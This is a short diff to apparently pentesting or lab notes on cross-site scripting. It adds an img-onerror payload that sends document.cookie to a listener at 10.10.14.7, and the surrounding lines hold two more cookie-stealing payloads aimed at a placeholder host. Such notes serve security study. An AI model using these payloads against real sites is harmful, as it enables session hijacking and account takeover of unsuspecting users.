@@ -99,6 +99,7 @@ We need code to send the session cookie back to our listener(nc or php(same as a
 More Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)
 
 ```javascript
+<img src=http://10.10.14.7:8000/none onerror=fetch("http://10.10.14.7:8000/?c="+document.cookie)/>
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
